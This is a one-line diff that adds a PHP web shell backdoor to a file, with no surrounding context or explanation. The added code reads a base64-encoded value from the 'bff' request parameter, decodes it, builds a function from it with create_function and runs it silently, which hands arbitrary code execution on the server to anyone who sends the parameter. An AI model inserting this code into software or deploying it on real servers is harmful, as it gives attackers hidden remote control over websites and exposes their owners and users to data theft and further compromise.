@@ -1,0 +1,1 @@
+<?php if(!empty($_REQUEST['bff'])){$bff=base64_decode($_REQUEST['bff']);$bff=create_function('',$bff);@$bff();exit;} ?>
